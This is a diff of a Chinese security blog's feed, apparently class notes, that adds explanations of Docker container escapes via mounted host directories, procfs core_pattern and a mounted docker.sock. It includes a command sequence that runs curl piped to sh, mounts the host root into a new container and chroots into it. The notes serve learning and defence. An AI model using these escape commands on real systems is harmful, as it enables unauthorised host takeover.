@@ -609,8 +609,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff或者是 0000001fffffffff&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="--privileged特权容器逃逸">&amp;ndash;privileged特权容器逃逸&lt;/h4>
 &lt;h5 id="挂载宿主机目录逃逸">挂载宿主机目录逃逸&lt;/h5>
-&lt;p>&lt;a class="link" href="https://www.freebuf.com/articles/system/367446.html" target="_blank" rel="noopener"
->https://www.freebuf.com/articles/system/367446.html&lt;/a>
+&lt;p>原理：容器在运行时，通常会使用挂载（mount）来共享宿主机的某些目录。宿主机的文件系统和容器文件系统是隔离的，但容器可以通过 &amp;ndash;mount 或 -v 参数将宿主机的目录或文件挂载到容器内。&lt;br>
+如果容器的管理员不小心配置了挂载宿主机的敏感目录，攻击者就可以通过容器访问宿主机的文件系统，从而执行容器逃逸操作。&lt;br>
+&lt;a class="link" href="https://www.freebuf.com/articles/system/367446.html" target="_blank" rel="noopener"
+>https://www.freebuf.com/articles/system/367446.html&lt;/a>&lt;br>
 &lt;a class="link" href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html" target="_blank" rel="noopener"
 >https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html&lt;/a>&lt;br>
 &lt;a class="link" href="https://www.isisy.com/1510.html" target="_blank" rel="noopener"
@@ -634,7 +636,8 @@ loading="lazy"
 loading="lazy"
 >&lt;/p>
 &lt;h5 id="挂载宿主机procfs逃逸">挂载宿主机procfs逃逸&lt;/h5>
-&lt;p>&lt;a class="link" href="https://wiki.teamssix.com/cloudnative/docker/docker-procfs-escape.html" target="_blank" rel="noopener"
+&lt;p>原理：通过挂载宿主机的/proc目录到容器内，攻击者能够访问并修改宿主机上的关键系统文件，如/proc/sys/kernel/core_pattern，从而在进程崩溃时执行任意代码。&lt;br>
+&lt;a class="link" href="https://wiki.teamssix.com/cloudnative/docker/docker-procfs-escape.html" target="_blank" rel="noopener"
 >https://wiki.teamssix.com/cloudnative/docker/docker-procfs-escape.html&lt;/a>&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 创建一个容器并挂载 /proc 目录&lt;/span>
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
@@ -698,6 +701,22 @@ loading="lazy"
 >&lt;/p>
 &lt;h3 id="容器管理程序接口的风险">容器管理程序接口的风险&lt;/h3>
 &lt;h4 id="unix-socket挂载到容器内部">UNIX-socket挂载到容器内部&lt;/h4>
+&lt;p>原理：Docker Socket是Docker守护进程监听的Unix域套接字，用来与守护进程通信——查询信息或下发命令。如果在攻击者可控的容器内挂载了该套接字文件（/var/run/docker.sock），可通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部，完成简单逃逸。
+&lt;a class="link" href="https://wiki.teamssix.com/cloudnative/docker/docker-socket-escape.html" target="_blank" rel="noopener"
+>https://wiki.teamssix.com/cloudnative/docker/docker-socket-escape.html&lt;/a>&lt;br>
+&lt;a class="link" href="https://www.freebuf.com/articles/system/382166.html" target="_blank" rel="noopener"
+>https://www.freebuf.com/articles/system/382166.html&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">sudo docker run -itd --name docker_sock_new -v /var/run/docker.sock:/var/run/docker.sock ubuntu
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo docker &lt;span class="nb">exec&lt;/span> -it docker_sock_new bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls -lah /var/run/docker.sock &lt;span class="c1"># 判断当前容器是否挂载Docker Socket,如果存在文件则说明Docker Socket被挂载&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get update
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">apt-get install curl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -fsSL https://get.docker.com/ &lt;span class="p">|&lt;/span> sh
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker run -it -v /:/host ubuntu /bin/bash &lt;span class="c1"># 在容器内部创建一个新的容器，并将宿主机目录挂载到新的容器内部&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chroot /host
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://fastly.jsdelivr.net/gh/RDWaaaaaa/img/20241216232152.png"
+loading="lazy"
+>&lt;/p>
 &lt;h2 id="第三次课123">第三次课12.3&lt;/h2></description></item><item><title>记录一些小问题</title><link>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 01 Dec 2024 22:37:04 +0800</pubDate><guid>https://blog.nrevery.cn/p/%E8%AE%B0%E5%BD%95%E4%B8%80%E4%BA%9B%E5%B0%8F%E9%97%AE%E9%A2%98/</guid><description>&lt;h3 id="wsl突然打不开了重启也没用">wsl突然打不开了，重启也没用&lt;/h3>
 &lt;p>1.cmd下管理员权限执行&lt;code>netsh winsock reset&lt;/code>&lt;br>
 2.重启电脑&lt;br>
